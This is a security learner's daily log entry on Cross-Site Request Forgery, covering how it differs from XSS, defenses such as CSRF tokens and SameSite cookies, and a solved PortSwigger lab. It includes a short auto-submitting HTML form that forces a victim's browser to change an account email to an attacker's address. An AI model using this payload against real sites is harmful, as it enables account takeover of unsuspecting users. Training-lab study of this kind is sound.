# 🎭 Day 12 – Cross-Site Request Forgery (CSRF)

### 🔍 What I Explored Today

Today’s focus was on understanding and practically implementing **CSRF (Cross-Site Request Forgery)** attacks. Initially, I was confused between **XSS** and **CSRF**, but I quickly realized that while XSS exploits trust **a user has in a site**, CSRF exploits the trust **a site has in a user's browser**.

---

### 📚 Topics Covered

- What is CSRF and how it works
- Impact of CSRF vulnerabilities in real-world apps
- Difference between XSS and CSRF
  - _💡 Can CSRF tokens prevent XSS attacks? → No, they are different threat vectors._
- Constructing a CSRF attack page manually
- Delivering an exploit using auto-submitting HTML forms
- Various defense mechanisms:
  - CSRF tokens
  - Referer/Origin header validation
  - SameSite cookie policies

---

### 🧪 Lab Completed – PortSwigger

| Lab | Status |
|-----|--------|
| 🧪 CSRF vulnerability with no defenses | ✅ Solved |

This beginner lab helped me manually construct a CSRF attack without any built-in security on the target page.

---

### 🧾 CSRF PoC I Crafted

```html
<form method="POST" action="(your)_LAB_ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="hacker@mail.com">
</form>
<script>
    document.forms[0].submit()
</script>
```
---
### 🎥 Resource That Helped Me
Here's a helpful YouTube video that explains how CSRF works:
[YouTube: CSRF - Cross Site Request Forgery - What is CSRF? How does CSRF work?](https://youtu.be/7Fs8DTITkoE?si=llXK0QMWzn_Zbh46)
This helped me understand the manual exploitation approach, since automatic CSRF PoC generation is only available in the Burp Suite Professional version.




---

### 💡 Key Takeaway
 CSRF may not give you flashy RCE shells, but it's powerful — especially in state-changing actions like email change, password resets, or fund transfers.
It reinforces the value of understanding how web applications trust user identity through sessions.

---
### 😵‍💫 My Struggles Today
I was initially confused between XSS and CSRF — especially in terms of where and how the attacker exploits trust.

googled a bit to get clear about the difference between cross-site scripting and request-forgery.

Realized the importance of SameSite cookie protection in modern browsers and how it's evolving.
